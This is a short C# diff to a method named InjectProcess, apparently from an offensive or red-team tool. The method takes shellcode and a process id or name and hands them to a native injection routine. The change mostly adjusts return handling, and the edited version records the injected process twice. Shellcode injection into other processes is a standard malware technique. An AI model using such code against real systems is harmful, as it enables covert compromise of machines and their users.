@@ -71,7 +71,7 @@ public class Tools
 
     public static bool InjectProcess(byte[] shellCode, int procid= -1, string name = null)
     {
-        if (procid==-1 && name == null)
+        if (procid == -1 && name == null) 
         {
             throw new Exception("Function must recive process id or process name");
         }
@@ -81,7 +81,12 @@ public class Tools
         }
         UIntPtr size_T = (UIntPtr)shellCode.Length;
         Info.AddInjectProcess(procid);
-        return NativeMethods.Inject(procid, shellCode, size_T) == 0;
+        if (NativeMethods.Inject(procid, shellCode, size_T) == 0)
+        {
+            Info.AddInjectProcess(procid);
+            return true; 
+        }
+        return false;
     }
 
 
